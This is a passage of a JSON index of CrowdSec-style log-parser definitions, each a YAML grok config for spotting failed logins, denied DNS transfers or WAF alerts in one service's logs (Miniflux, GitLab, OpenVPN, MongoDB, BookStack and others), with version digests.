client_ip=%{IP:source_ip} .*username=%{USERNAME:username} .*error=\"store: unable to find this user: %{USERNAME}\"'\n      # miniflux  | time=2024-01-12T22:54:56.307Z level=WARN msg=\"Incorrect username or password\" authentication_failed=true client_ip=192.168.0.254 user_agent=\"Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36\" username=hacker1 error=\"store: unable to find this user: hacker1\"\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: miniflux_failed_auth\n        - meta: log_subtype\n          value: miniflux_bad_user\n        - meta: evt.StrTimeFormat\n          value: \"2006-01-02T15:04:05.999Z\"\n\nstatics:\n    - meta: service\n      value: miniflux\n    - meta: user\n      expression: evt.Parsed.username\n    - meta: source_ip\n      expression: evt.Parsed.source_ip\n    - target: evt.StrTime\n      expression: evt.Parsed.timestamp\n\n", "description": "Parse Miniflux logs", "path": "parsers/s01-parse/jbowdre/miniflux-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "abb550ae0d333a6bf061b6aa37dcc1afe2af65c30c3e08e77394dee02b8b1b57"}}}, "jusabatier/apereo-cas-audit-logs": {"content": "onsuccess: next_stage\n#debug: true\nfilter: \"evt.Parsed.program == 'cas'\"\nname: jusabatier/apereo-cas-audit-logs\ndescription: \"Parse apereo CAS Audits logs\"\npattern_syntax:\n# The IP grok pattern that ships with crowdsec is buggy and does not capture the last digit of an IP if it is the last thing it matches, and the last octet starts with a 2\n# https://github.com/crowdsecurity/crowdsec/issues/938\n  IPv4_WORKAROUND: (?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\n  IP_WORKAROUND: (?:%{IPV6}|%{IPv4_WORKAROUND})\n  SECOND_WORKAROUND: '(?:[0-5]?[0-9]|60)?'\n  TIMESTAMP_WORKAROUND: '%{YEAR}-%{MONTHNUM}-%{MONTHDAY}[T ]%{HOUR}:?%{MINUTE}(?::?%{SECOND_WORKAROUND})?%{ISO8601_TIMEZONE}?'\n  CAS_AUTH_FAIL: '^%{TIMESTAMP_WORKAROUND:time}(?:,\\d+)? %{LOGLEVEL:loglevel} \\[%{DATA:threadname}\\] - (.*)\\|CAS\\|(.*)\\|AUTHENTICATION_FAILED\\|%{USERNAME:cas_invalid_user}\\|%{IP_WORKAROUND:cas_client_ip}\\|(.*)$'\nnodes:\n  - grok: \n      name: \"CAS_AUTH_FAIL\"\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: cas_failed-auth\n        - meta: target_user\n          expression: \"evt.Parsed.cas_invalid_user\"\n        - target: evt.StrTime\n          expression: evt.Parsed.time\nstatics:\n    - meta: service\n      value: cas\n    - meta: source_ip\n      expression: \"evt.Parsed.cas_client_ip\"\n", "description": "Parse apereo CAS Audits logs", "path": "parsers/s01-parse/jusabatier/apereo-cas-audit-logs.yaml", "stage": "s01-parse", "version": "0.2", "versions": {"0.1": {"digest": "af0a0f7f973f2e7234b8b1866c3f4182e0b8945eedcf2dee2d0556a5aab87b6c"}, "0.2": {"digest": "a8c04c2fd8c3c0980a0aec849bcc044c1140ca971a03cf606742228a584a49fa"}}}, "lourys/pterodactyl-wings-logs": {"content": "name: lourys/pterodactyl-wings-logs\ndescription: \"Parse Pterodactyl wings logs\"\npattern_syntax:\n  PTERO_TIME: \"\\\\b[A-Z][a-z]{2}.*\\\\d{1,2} \\\\d{2}:\\\\d{2}:\\\\d{2}\\\\b\"\nfilter: \"evt.Parsed.program == 'pterodactyl'\"\ndebug: false\nonsuccess: next_stage\nnodes:\n  - grok:\n      pattern: '^\\s*WARN: \\[%{PTERO_TIME:time}.*?\\] failed to validate user credentials \\(invalid format\\) ip=%{IPORHOST:source_ip}:%{NUMBER:source_port}.* username=%{USERNAME:username}$'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: pterodactly_wings_invalid_format\n  - grok:\n      pattern: '^\\s*WARN: \\[%{PTERO_TIME:time}.*?\\] failed to validate user credentials \\(invalid username or password\\) ip=%{IPORHOST:source_ip}:%{NUMBER:source_port}.* username=%{USERNAME:username}$'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: pterodactly_wings_invalid_username_or_password\nstatics:\n    - meta: service\n      value: pterodactyl\n    - meta: source_ip\n      expression: evt.Parsed.source_ip\n    - meta: target_user\n      expression: evt.Parsed.username\n    - target: evt.StrTime\n      expression: evt.Parsed.time\n", "description": "Parse Pterodactyl wings logs", "path": "parsers/s01-parse/lourys/pterodactyl-wings-logs.yaml", "stage": "s01-parse", "version": "0.3", "versions": {"0.1": {"digest": "cf8d159aaa3091b95c9bfe97ef942a2742c65b303c101c2822d5bcfefabda19b"}, "0.2": {"digest": "b52b21544853b162e2841ebe6a269349e41ab9bc5567dd5374d140b3f901242f"}, "0.3": {"digest": "1d528cff8ec66f866a1ef94b3ca914f92f4de14a22c5720156412516a2511a68"}}}, "mstilkerich/bind9-logs": {"content": "---\nfilter: \"Upper(evt.Parsed.program) == 'NAMED'\"\n#debug: true\nonsuccess: next_stage\npattern_syntax:\n  BIND9_TIMESTAMP_DATE: '%{MONTHDAY:ts_d}-%{MONTH:ts_m}-%{YEAR:ts_y}'\n  BIND9_TIMESTAMP_TIMEMS: '\\d{3}'\n  BIND9_TIMESTAMP_TIME: '%{TIME:ts_t}\\.%{BIND9_TIMESTAMP_TIMEMS:ts_ms}'\n  BIND9_TIMESTAMP: '%{BIND9_TIMESTAMP_DATE} %{BIND9_TIMESTAMP_TIME}'\n  # categories: security, client, update-security, etc.\n  BIND9_CATEGORY: '[a-z]+'\n  BIND9_SEVERITY: '[a-z]+'\n  BIND9_PREFIX: '^(%{BIND9_TIMESTAMP:timestamp} )?(%{BIND9_CATEGORY}: )?(%{BIND9_SEVERITY}: )?client (@0x[0-9a-fA-F]+ )?%{IP:remote_addr}#%{POSINT:remote_port}.*: '\nname: mstilkerich/bind9\ndescription: \"Parse bind9 logs\"\nnodes:\n  # When multiple grok patterns are specified, only the first matching one is applied\n  - grok:\n      pattern: '^%{BIND9_PREFIX}zone transfer .* (?:denied|\\(NOTAUTH\\))\\s*$'\n      apply_on: message\n  - grok:\n      pattern: '^%{BIND9_PREFIX}bad zone transfer request: ''\\S+/IN'': non-authoritative zone (?:denied|\\(NOTAUTH\\))\\s*$'\n      apply_on: message\n  - grok:\n      pattern: '^%{BIND9_PREFIX}(?:view (?:internal|external): )?query(?: \\(cache\\))? .* (?:denied|\\(NOTAUTH\\)).*$'\n      apply_on: message\nstatics:\n  - meta: service\n    value: bind9\n  - meta: log_type\n    value: bind9_denied\n  - meta: source_ip\n    expression: \"evt.Parsed.remote_addr\"\n  - target: evt.StrTime  # convert time format for dateparse-enrich\n    expression: \"\n      {Jan:'01',Feb:'02',Mar:'03',Apr:'04',May:'05',Jun:'06',Jul:'07',Aug:'08',Sep:'09',Oct:'10',Nov:'11',Dec:'12'}[evt.Parsed.ts_m]\n      + '/' + evt.Parsed.ts_d\n      + '/' + evt.Parsed.ts_y\n      + ' ' + evt.Parsed.ts_t\"\n", "description": "Parse bind9 logs", "path": "parsers/s01-parse/mstilkerich/bind9-logs.yaml", "stage": "s01-parse", "version": "0.4", "versions": {"0.1": {"digest": "dac58be63dd386df2c4e46b20ded0b98e66195a102c63d6a7e6cbcb2bfef276c"}, "0.2": {"digest": "34dd8aa4788b9a05bfeb42ba70c279e042bb4b63fd8184e05081bc2adb818bff"}, "0.3": {"digest": "23bb518c2285a387734e227634bcc1a056dc9490c27547fb447b9c8ce7a03458"}, "0.4": {"digest": "d406d59f5e08a877cc0a866d71224f8e6e631682c81affb6aeeee4bf5ed4e13e"}}}, "mwinters-stuff/mailu-admin-logs": {"content": "# debug: true\nonsuccess: next_stage\nname: mwinters-stuff/mailu-admin-logs\ndescription: \"Parse mailu-admin logs\"\nfilter: \"evt.Parsed.program == 'mailu-admin'\"\ngrok:\n  pattern:  \"\\\\[%{TIMESTAMP_ISO8601:timestamp8601},.*\\\\] WARNING in limiter: Authentication attempt from %{IP:source_ip} has been rate-limited.\"\n  apply_on: message\nstatics:\n  - meta: log_type\n    value: mailu_admin_auth_attempt\n  - meta: service\n    value: mailu-admin\n  - meta: source_ip \n    expression: \"evt.Parsed.source_ip\"\n  - target: evt.StrTime\n    expression: \"evt.Parsed.timestamp8601\"\n", "description": "Parse mailu-admin logs", "path": "parsers/s01-parse/mwinters-stuff/mailu-admin-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "b69404738235f2b972d94bcf089a4f2473c56da39c62a6c16b372e4908dbed32"}}}, "openappsec/openappsec-logs": {"content": "name: openappsec/openappsec-logs\ndescription: \"Parse openappsec logs\"\nfilter: \"evt.Parsed.program == 'openappsec' && JsonExtract(evt.Parsed.message, 'eventAudience') == 'Security' && Lower(JsonExtract(evt.Parsed.message, 'eventSeverity')) in ['critical', 'high'] && Lower(JsonExtract(evt.Parsed.message, 'eventData.practiceSubType')) in ['web application','web api']\"  \ndebug: false\nonsuccess: next_stage\nstatics:\n  - meta: service\n    value: openappsec\n  - meta: log_type\n    value: openappsec_security_log\n  - target: evt.StrTimeFormat\n    value: \"2006-01-02T15:04:05\"\n  - target: evt.StrTime\n    expression: JsonExtract(evt.Parsed.message, \"eventTime\")\n  - meta: event_name\n    expression: JsonExtract(evt.Parsed.message, \"eventName\")\n  - meta: event_severity\n    expression: JsonExtract(evt.Parsed.message, \"eventSeverity\")\n  - meta: event_priority\n    expression: JsonExtract(evt.Parsed.message, \"eventPriority\")\n  - meta: event_audience\n    expression: JsonExtract(evt.Parsed.message, \"eventAudience\")\n  - meta: source_ip\n    expression: JsonExtract(evt.Parsed.message, \"eventData.httpSourceId\")\n  - meta: event_confidence\n    expression: JsonExtract(evt.Parsed.message, \"eventData.eventConfidence\")\n  - meta: security_action\n    expression: JsonExtract(evt.Parsed.message, \"eventData.securityAction\")\n  - meta: source_identifier\n    expression: JsonExtract(evt.Parsed.message, \"eventData.httpSourceId\")\n  - meta: matched_sample\n    expression: JsonExtract(evt.Parsed.message, \"eventData.matchedSample\")\n  - meta: matched_parameter\n    expression: JsonExtract(evt.Parsed.message, \"eventData.matchedParameter\")\n  - meta: matched_location\n    expression: JsonExtract(evt.Parsed.message, \"eventData.matchedLocation\")\n  - meta: incident_type\n    expression: JsonExtract(evt.Parsed.message, \"eventData.waapIncidentType\")", "description": "Parse openappsec logs", "path": "parsers/s01-parse/openappsec/openappsec-logs.yaml", "stage": "s01-parse", "version": "0.2", "versions": {"0.1": {"digest": "9d3a2398563eddd828a5503aebdcfaf12d895f65fe2f6d75b121d9f87fd52f1f"}, "0.2": {"digest": "b2dc1c54de5ac8185e8ac4ee319ff44f325ff19b638aa76037d11c9eb2e7aa07"}}}, "plague-doctor/audiobookshelf-logs": {"content": "onsuccess: next_stage\n#debug: true\nfilter: \"Upper(evt.Parsed.program) == 'AUDIOBOOKSHELF'\"\nname: plague-doctor/audiobookshelf-logs\ndescription: \"Parse Audiobookshelf logs\"\npattern_syntax:\n    ABS_FAILED_AUTH: '\\[Auth\\] Failed login attempt for username \\\\?\"%{USERNAME:username}\\\\?\" from ip %{IP:source_ip} \\(%{DATA:reason}\\)'\nnodes:\n    - grok:\n        pattern: '\\[%{TIMESTAMP_ISO8601:timestamp}\\] ERROR: %{ABS_FAILED_AUTH}'\n        apply_on: message\n      statics:\n        - meta: log_type\n          value: abs_failed_auth\n    - filter: 'UnmarshalJSON(evt.Parsed.message, evt.Unmarshaled, \"abs\") in [\"\", nil]'\n      grok:\n        pattern: \"%{ABS_FAILED_AUTH}\"\n        expression: evt.Unmarshaled.abs.message\n        statics:\n          - meta: log_type\n            value: abs_failed_auth\nstatics:\n    - meta: service\n      value: audiobookshelf\n    - meta: source_ip\n      expression: \"evt.Parsed.source_ip\"\n    - target: evt.StrTime\n      expression: 'evt.Parsed.timestamp != \"\" ? evt.Parsed.timestamp : evt.Unmarshaled.abs.timestamp'\n    ## We check if the parser parsed the timestamp or if it within the json output\n    - meta: username\n      expression: \"evt.Parsed.username\"\n", "description": "Parse Audiobookshelf logs", "path": "parsers/s01-parse/plague-doctor/audiobookshelf-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "0ddcd5786e0667d930a92080969958540cb93a9891e04cd5f9d0049c03eae252"}}}, "pserranoa/openvpn": {"content": "filter: \"evt.Line.Labels.type == 'openvpn'\"\nonsuccess: next_stage\nname: pserranoa/openvpn\ndescription: \"Parse openvpn logs\"\npattern_syntax:\n    OPENVPN_TLS_AUTH_ERROR: \"%{TIMESTAMP_ISO8601:timestamp} (?:%{WORD:client}/|)%{IPV4:source_ip}:%{INT:sport} TLS Auth Error:.*\"\n    OPENVPN_AUTH_FAILED: \"%{TIMESTAMP_ISO8601:timestamp} (?:%{WORD:client}/|)%{IPV4:source_ip}:%{INT:sport} AUTH: Received control message: AUTH_FAILED\"\n    OPENVPN_AUTH_VERIFY_ERROR: \"%{TIMESTAMP_ISO8601:timestamp} (?:%{WORD:client}/|)%{IPV4:source_ip}:%{INT:source_port} VERIFY ERROR:.*\"\n    OPENVPN_TLS_CRYPT: \"%{TIMESTAMP_ISO8601:timestamp} (?:%{WORD:client}/|)%{IPV4:source_ip}:%{INT:sport} TLS Error: tls-crypt unwrapping failed from.*\"\n    OPENVPN_TLS_PACKET: \"%{TIMESTAMP_ISO8601:timestamp} (?:%{WORD:client}/|)%{IPV4:source_ip}:%{INT:sport} TLS Error: incoming packet authentication failed from.*\"\n    OPENVPN_TLS_HANDSHAKE: \"%{TIMESTAMP_ISO8601:timestamp} (?:%{WORD:client}/|)%{IPV4:source_ip}:%{INT:sport} TLS Error: TLS handshake failed from.*\"\n    OPENVPN_TLS_CERT: \"%{TIMESTAMP_ISO8601:timestamp} (?:%{WORD:client}/|)%{IPV4:source_ip}:%{INT:source_port} OpenSSL: error:%{WORD}:.*verify failed\"\nnodes:\n  - grok:\n      name: \"OPENVPN_TLS_AUTH_ERROR\"\n      apply_on: message\n  - grok:\n      name: \"OPENVPN_AUTH_FAILED\"\n      apply_on: message\n  - grok:\n      name: \"OPENVPN_AUTH_VERIFY_ERROR\"\n      apply_on: message\n  - grok:\n      name: \"OPENVPN_TLS_CRYPT\"\n      apply_on: message\n  - grok:\n      name: \"OPENVPN_TLS_PACKET\"\n      apply_on: message\n  - grok:\n      name: \"OPENVPN_TLS_HANDSHAKE\"\n      apply_on: message\n  - grok:\n      name: \"OPENVPN_TLS_CERT\"\n      apply_on: message\nstatics:\n  - meta: service\n    value: openvpn\n  - meta: source_ip\n    expression: \"evt.Parsed.source_ip\"\n  - meta: log_type\n    value: auth_failed\n  - target: evt.StrTime\n    expression: evt.Parsed.timestamp\n", "description": "Parse openvpn logs", "path": "parsers/s01-parse/pserranoa/openvpn.yml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "a5a9971734da0643c3ad024b75f93fa98b4bf5a089436d8a383f2216091ec0d6"}}}, "schiz0phr3ne/prowlarr-logs": {"content": "onsuccess: next_stage\nfilter: \"evt.Parsed.program == 'Prowlarr'\"\nname: schiz0phr3ne/prowlarr-logs\ndescription: \"Parse Prowlarr Logs\"\npattern_syntax:\n  DATE_YMD: \"%{YEAR:year}-%{MONTHNUM:month}-%{MONTHDAY:day}\"\nnodes:\n  - grok:\n      pattern: '^\\[Warn\\] Auth: Auth-Failure ip %{IP:source_ip} username %{DATA:username}$'\n      apply_on: message\n  - grok:\n      pattern: \"%{DATE_YMD:date} %{TIME:time}\\\\|%{WORD:log_level}\\\\|Auth\\\\|Auth-Failure ip %{IPORHOST:source_ip} username '%{NOTDQUOTE:username}'\"\n      apply_on: message\n      statics:\n        - target: evt.Parsed.timestamp\n          expression: \"evt.Parsed.date + ' ' + evt.Parsed.time\"\n    onsuccess: next_stage\nstatics:\n    - meta: log_type\n      value: prowlarr_failed_authentication\n    - meta: service\n      value: prowlarr\n    - meta: source_ip\n      expression: \"evt.Parsed.source_ip\"\n    - target: evt.StrTime\n      expression: \"evt.Parsed.timestamp\"\n    - meta: username\n      expression: evt.Parsed.username\n", "description": "Parse Prowlarr Logs", "path": "parsers/s01-parse/schiz0phr3ne/prowlarr-logs.yaml", "stage": "s01-parse", "version": "0.2", "versions": {"0.1": {"digest": "d061ec42abfa9633d082cd0a6a08ceef88b2cc623f316209b96de202d7cc9f3f"}, "0.2": {"digest": "1241ce93797a175bb42dcd08f1b01e3fe68342f25a9f7ba769f0cf4c223ec6ae"}}}, "schiz0phr3ne/radarr-logs": {"content": "onsuccess: next_stage\nfilter: \"evt.Parsed.program == 'Radarr'\"\nname: schiz0phr3ne/radarr-logs\ndescription: \"Parse Radarr Logs\"\npattern_syntax:\n  DATE_YMD: \"%{YEAR:year}-%{MONTHNUM:month}-%{MONTHDAY:day}\"\nnodes:\n  - grok:\n      pattern: '^\\[Warn\\] Auth: Auth-Failure ip %{IP:source_ip} username %{DATA:username}$'\n      apply_on: message\n    onsuccess: next_stage\n  - grok:\n      pattern: \"%{DATE_YMD:date} %{TIME:time}\\\\|%{WORD:log_level}\\\\|Auth\\\\|Auth-Failure ip %{IPORHOST:source_ip} username '%{NOTDQUOTE:username}'\"\n      apply_on: message\n      statics:\n        - target: evt.Parsed.timestamp\n          expression: \"evt.Parsed.date + ' ' + evt.Parsed.time\"\n    onsuccess: next_stage\n\nstatics:\n    - meta: service\n      value: radarr\n    - meta: source_ip\n      expression: \"evt.Parsed.source_ip\"\n    - target: evt.StrTime\n      expression: \"evt.Parsed.timestamp\"\n    - meta: username\n      expression: evt.Parsed.username\n    - meta: log_type\n      value: radarr_failed_authentication\n", "description": "Parse Radarr Logs", "path": "parsers/s01-parse/schiz0phr3ne/radarr-logs.yaml", "stage": "s01-parse", "version": "0.2", "versions": {"0.1": {"digest": "0d9d4cb7e4a592ec3e56e89cb7fe97b22390d011c4b86ac85affd2db491049b0"}, "0.2": {"digest": "4bf7eb011ade9f74946a10dd8faeb8b78b96af92908fe2d6922f58f8a465991f"}}}, "schiz0phr3ne/sonarr-logs": {"content": "onsuccess: next_stage\nfilter: \"evt.Parsed.program in ['mono', 'Sonarr']\"\nname: schiz0phr3ne/sonarr-logs\ndescription: \"Parse Sonarr Logs\"\npattern_syntax:\n  DATE_YMD: \"%{YEAR:year}-%{MONTHNUM:month}-%{MONTHDAY:day}\"\nnodes:\n  - grok:\n      pattern: '^\\[Warn\\] Auth: Auth-Failure ip %{IP:source_ip} username %{DATA:username}$'\n      apply_on: message\n  - grok:\n      pattern: \"%{DATE_YMD:date} %{TIME:time}\\\\|%{WORD:log_level}\\\\|Auth\\\\|Auth-Failure ip %{IPORHOST:source_ip} username '%{NOTDQUOTE:username}'\"\n      apply_on: message\n      statics:\n        - target: evt.Parsed.timestamp\n          expression: \"evt.Parsed.date + ' ' + evt.Parsed.time\"\n    onsuccess: next_stage\n\nstatics:\n    - meta: log_type\n      value: sonarr_failed_authentication\n    - meta: service\n      value: sonarr\n    - meta: source_ip\n      expression: \"evt.Parsed.source_ip\"\n    - target: evt.StrTime\n      expression: \"evt.Parsed.timestamp\"\n    - meta: username\n      expression: evt.Parsed.username\n", "description": "Parse Sonarr Logs", "path": "parsers/s01-parse/schiz0phr3ne/sonarr-logs.yaml", "stage": "s01-parse", "version": "0.2", "versions": {"0.1": {"digest": "457e4e03b538b3f3a5ca4aadb3d26c695a6857c7ddbdae5d31dea87c164bdc67"}, "0.2": {"digest": "0ad020fa5caa6d7601fc2ceb54d68cc6d3caa31fdfab18158579c0da7a46a1ee"}}}, "sdwilsh/navidrome-logs": {"content": "---\n#debug: true\nfilter: \"evt.Parsed.program == 'navidrome' && ParseKV(evt.Parsed.message, evt.Unmarshaled, 'navidrome') in ['', nil]\"\nonsuccess: next_stage\nname: sdwilsh/navidrome-logs\ndescription: Parses logs from Navidrome\nstatics:\n  - meta: service\n    value: navidrome\n  - meta: log_type\n    expression: |\n      evt.Unmarshaled.navidrome.httpStatus == '401' && evt.Unmarshaled.navidrome.msg contains '/auth/login' ? 'navidrome_failed_auth' : ''\n  - meta: http_status\n    expression: evt.Unmarshaled.navidrome.httpStatus\n  - target: evt.StrTime\n    expression: evt.Unmarshaled.navidrome.time\n  - meta: source_ip\n    expression: evt.Unmarshaled.navidrome.remoteAddr\n  - meta: http_user_agent\n    expression: evt.Unmarshaled.navidrome.userAgent\n", "description": "Parses logs from Navidrome", "path": "parsers/s01-parse/sdwilsh/navidrome-logs.yaml", "stage": "s01-parse", "version": "0.2", "versions": {"0.1": {"digest": "d11a666f6d9e26803baaf1b69e623bd8066abf594a3872cbc4da7f7a8d8f7d09"}, "0.2": {"digest": "7fa8d7324d1ffc93f9d69c453b8b9fdcbd214703ad3c15552b0cd1367a7e1481"}}}, "thespad/sshesame-logs": {"content": "onsuccess: next_stage\nfilter: \"evt.Parsed.program == 'sshesame'\"\nname: thespad/sshesame-logs\ndescription: \"Parse sshesame logs\"\npattern_syntax:\n  SSHESAME_TIMESTAMP: '%{DATE_X} %{TIME}'\n  SSHESAME_LOGIN_PASSWD: '%{SSHESAME_TIMESTAMP:timestamp} \\[%{IP:source_ip}:\\d+\\] authentication for user \"%{USERNAME:sshesame_user}\" with password \"%{GREEDYDATA:sshesame_password}\" accepted'\n  SSHESAME_LOGIN_PUBKEY: '%{SSHESAME_TIMESTAMP:timestamp} \\[%{IP:source_ip}:\\d+\\] authentication for user \"%{USERNAME:sshesame_user}\" with public key \"%{GREEDYDATA:sshesame_pubkey}\" accepted'\n  SSHESAME_CMD: '%{SSHESAME_TIMESTAMP:timestamp} \\[%{IP:source_ip}:\\d+\\] \\[channel \\d+\\] command \"%{GREEDYDATA:sshesame_cmd}\" requested'\n  SSHESAME_INPUT: '%{SSHESAME_TIMESTAMP:timestamp} \\[%{IP:source_ip}:\\d+\\] \\[channel \\d+\\] input: \"%{GREEDYDATA:sshesame_input}\"'\nnodes:\n  - grok:\n      name: \"SSHESAME_LOGIN_PASSWD\"\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: sshesame_login\n        - meta: target_user\n          expression: \"evt.Parsed.sshesame_user\"\n  - grok:\n      name: \"SSHESAME_LOGIN_PUBKEY\"\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: sshesame_login\n        - meta: target_user\n          expression: \"evt.Parsed.sshesame_user\"\n  - grok:\n      name: \"SSHESAME_CMD\"\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: sshesame_cmd\n  - grok:\n      name: \"SSHESAME_INPUT\"\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: sshesame_input\nstatics:\n    - target: evt.StrTime\n      expression: \"evt.Parsed.timestamp\"\n    - meta: service\n      value: sshesame\n    - meta: source_ip\n      expression: \"evt.Parsed.source_ip\"\n    - meta: username\n      expression: \"evt.Parsed.sshesame_user\"\n    - meta: command\n      expression: \"evt.Parsed.sshesame_cmd\"\n    - meta: input\n      expression: \"evt.Parsed.sshesame_input\"\n", "description": "Parse sshesame logs", "path": "parsers/s01-parse/thespad/sshesame-logs.yaml", "stage": "s01-parse", "version": "0.2", "versions": {"0.1": {"digest": "7c778f2e6a003de5859de6bbbc91d549c7225c7e4b0b8c229f4e2ce7fecf088a"}, "0.2": {"digest": "4e0cb478023fc6bed1f04be0d8615f98446c1bb8f16680113af661f1d13ac953"}}}, "timokoessler/gitlab-logs": {"content": "onsuccess: next_stage\nfilter: \"Upper(evt.Parsed.program) == 'GITLAB' && UnmarshalJSON(evt.Parsed.message, evt.Unmarshaled, 'gitlab') in ['', nil]\"\nname: timokoessler/gitlab-logs\ndescription: \"Parse GitLab Logs\"\nnodes:\n  - filter: |\n      evt.Unmarshaled.gitlab.method == 'POST' &&\n      evt.Unmarshaled.gitlab.path in ['/users/sign_in', '/users/auth/ldapmain/callback'] &&\n      any(evt.Unmarshaled.gitlab.params, {.key == 'user' && .value.login != ''}) &&\n      (evt.Unmarshaled.gitlab.status == 0 || evt.Unmarshaled.gitlab.action == 'failure')\n    statics:\n      - meta: log_type\n        value: \"gitlab_failed_password\"\n      - meta: username\n        expression: filter(evt.Unmarshaled.gitlab.params, {.key == 'user' && .value.login != ''})[0]['value']['login']\n  - filter: |\n      evt.Unmarshaled.gitlab.method == 'POST' &&\n      evt.Unmarshaled.gitlab.path in ['/users/sign_in', '/users/auth/ldapmain/callback'] &&\n      any(evt.Unmarshaled.gitlab.params, {.key == 'username' && .value != ''}) &&\n      (evt.Unmarshaled.gitlab.status == 0 || evt.Unmarshaled.gitlab.action == 'failure')\n    statics:\n      - meta: log_type\n        value: \"gitlab_failed_password\"\n      - meta: username\n        expression: filter(evt.Unmarshaled.gitlab.params, {.key == 'username' && .value != ''})[0]['value']\n  - filter: |\n      evt.Unmarshaled.gitlab.method == 'POST' &&\n      evt.Unmarshaled.gitlab.path == '/users/sign_in' &&\n      any(evt.Unmarshaled.gitlab.params, {.key == 'user' && .value.otp_attempt != nil}) &&\n      evt.Unmarshaled.gitlab.status != 302\n    statics:\n      - meta: log_type\n        value: \"gitlab_failed_totp\"\n\nstatics:\n  - meta: service\n    value: gitlab\n  - meta: source_ip\n    expression: evt.Unmarshaled.gitlab.remote_ip\n  - parsed: timestamp\n    expression: evt.Unmarshaled.gitlab.time\n  - target: evt.StrTime\n    expression: \"evt.Parsed.timestamp\"\n", "description": "Parse GitLab Logs", "path": "parsers/s01-parse/timokoessler/gitlab-logs.yaml", "stage": "s01-parse", "version": "0.3", "versions": {"0.1": {"digest": "14e3359355433275065f1451beb547ed3b282292af41b02c3121a71395138ac2"}, "0.2": {"digest": "553bd740e845388748729b3f8210569297b265a94d6faaca7ee4b89ca4d500aa"}, "0.3": {"digest": "fffe5b2a199b3fb6178bc87775af84a62201f6c3b2d93319b31ecd607e16791a"}}}, "timokoessler/mongodb-logs": {"content": "onsuccess: next_stage\nfilter: \"Upper(evt.Parsed.program) == 'MONGODB'\"\nname: timokoessler/mongodb-logs\ndescription: \"Parse MongoDB logs\"\nnodes:\n  - filter: |\n     JsonExtract(evt.Parsed.message, \"c\") == 'ACCESS' &&\n     JsonExtract(evt.Parsed.message, \"msg\") == 'Authentication failed'\n    statics:\n      - meta: log_type\n        value: \"mongodb_failed_auth\"\n    grok:\n      pattern: '%{IPORHOST:remote_addr}'\n      expression: JsonExtract(evt.Parsed.message, \"attr.remote\")\n\nstatics:\n  - meta: service\n    value: mongodb\n  - meta: source_ip\n    expression: \"evt.Parsed.remote_addr\"\n  - parsed: timestamp\n    expression: JsonExtract(evt.Parsed.message, \"t.$date\")\n  - target: evt.StrTime\n    expression: \"evt.Parsed.timestamp\"\n  - meta: username\n    expression: JsonExtract(evt.Parsed.message, \"attr.principalName\")\n  - meta: authentication_database\n    expression: JsonExtract(evt.Parsed.message, \"attr.authenticationDatabase\")", "description": "Parse MongoDB logs", "path": "parsers/s01-parse/timokoessler/mongodb-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "1e2e1a5beb799d0d533cfc5fc3a490c1860c55d518c3a3edb77f3c47ebc4c55b"}}}, "timokoessler/uptime-kuma-logs": {"content": "onsuccess: next_stage\nfilter: \"Upper(evt.Parsed.program) == 'UPTIME-KUMA'\"\nname: timokoessler/uptime-kuma-logs\ndescription: \"Parse Uptime Kuma Logs\"\nnodes:\n  - grok:\n      pattern: '^%{TIMESTAMP_ISO8601:timestamp} \\[AUTH\\] WARN: Incorrect username or password for user %{DATA:username}\\. IP=%{IP:source_ip}$'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: uptime_kuma_failed_password\n  - grok:\n      pattern: '^%{TIMESTAMP_ISO8601:timestamp} \\[AUTH\\] WARN: Invalid token provided for user %{DATA:username}\\. IP=%{IP:source_ip}$'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: uptime_kuma_failed_totp\n\nstatics:\n    - meta: service\n      value: uptime-kuma\n    - meta: source_ip\n      expression: \"evt.Parsed.source_ip\"\n    - target: evt.StrTime\n      expression: \"evt.Parsed.timestamp\"\n    - meta: username\n      expression: evt.Parsed.username\n", "description": "Parse Uptime Kuma Logs", "path": "parsers/s01-parse/timokoessler/uptime-kuma-logs.yaml", "stage": "s01-parse", "version": "0.2", "versions": {"0.1": {"digest": "7fe2f059bf9f3a60c6ab262d5ac1efe98812a85fe6c11e4d91b6a25d8e42b4ac"}, "0.2": {"digest": "2732333702233c0854e833ae830f7ab8ac8aebeaf3decab285f865a00164701c"}}}, "xs539/bookstack-logs": {"content": "onsuccess: next_stage\nfilter: \"Lower(evt.Parsed.program) in ['bookstack']\"\nname: xs539/bookstack-logs\ndescription: \"Parse bookstack logs\"\npattern_syntax:\n  BOOKSTACK_USER: \"(%{EMAILADDRESS}|%{USERNAME})\"\nnodes:\n  - grok:\n      pattern: '%{NGINXERRTIME:timestamp}%{GREEDYDATA}Failed login for %{BOOKSTACK_USER:target_user}%{GREEDYDATA}client: %{IPORHOST:remote_addr}'\n      apply_on: message\n  - grok:\n      pattern: '\\[%{APACHEERRORTIME:timestamp}\\] \\[php:%{WORD:log_level}\\] \\[pid %{INT:pid}\\] \\[client %{IPORHOST:remote_addr}(:%{INT:remote_port})?\\] Failed login for %{BOOKSTACK_USER:target_user}(, referer: %{GREEDYDATA:http_referer})?'\n      apply_on: message\nstatics:\n    - meta: log_type\n      value: bookstack_failed_auth\n    - meta: target_user\n      expression: evt.Parsed.target_user\n    - meta: service\n      value: bookstack\n    - target: evt.StrTime\n      expression: evt.Parsed.timestamp\n    - meta: source_ip\n      expression: evt.Parsed.remote_addr\n", "description": "Parse bookstack logs", "path": "parsers/s01-parse/xs539/bookstack-logs.yaml", "stage": "s01-parse", "version": "0.2", 